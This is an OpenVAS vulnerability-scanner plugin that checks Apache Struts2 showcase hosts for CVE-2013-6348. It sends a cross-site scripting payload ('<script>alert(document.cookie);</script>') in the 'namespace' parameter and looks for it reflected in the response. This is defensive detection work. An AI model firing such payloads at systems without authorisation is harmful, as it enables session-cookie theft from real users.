###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_showcase_namespace_xss_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# Apache Struts2 showcase namespace XSS Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803958");
  script_version("$Revision: 11401 $");
  script_cve_id("CVE-2013-6348");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-10-29 15:36:50 +0530 (Tue, 29 Oct 2013)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Apache Struts2 showcase namespace XSS Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Apache Struts2
  showcase and is prone to cross-site scripting Vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP
  GET request and check whether it is able to read the string or not.");

  script_tag(name:"insight", value:"An error exists in the application which fails
  to properly sanitize user-supplied input to 'namespace' parameter before using it.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers
  to steal the victim's cookie-based authentication credentials.");

  script_tag(name:"affected", value:"Apache Struts2 2.3.15.3");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/struts-23153-cross-site-scripting");
  script_xref(name:"URL", value:"http://www.securityhome.eu/exploits/exploit.php?eid=156451617526e27dd866c97.43571723");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_apache_struts2_detection.nasl");
  script_mandatory_keys("ApacheStruts/installed");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!asport = get_app_port(cpe:CPE)){
 exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:asport)){
  exit(0);
}

asreq = http_get(item:string(dir,"/showcase.action"), port:asport);
asres = http_keepalive_send_recv(port:asport, data:asreq);

if(asres && "The Apache Software Foundation" >< asres && "Showcase<" >< asres &&
   "struts" >< asres)
{
  url = dir + "/config-browser/actionNames.action?namespace=<script>alert(document.cookie);</script>";
  match = "<script>alert\(document.cookie\);</script>";

  if(http_vuln_check(port:asport, url:url, check_header:TRUE,
         pattern:match))
  {
    security_message(asport);
    exit(0);
  }
}
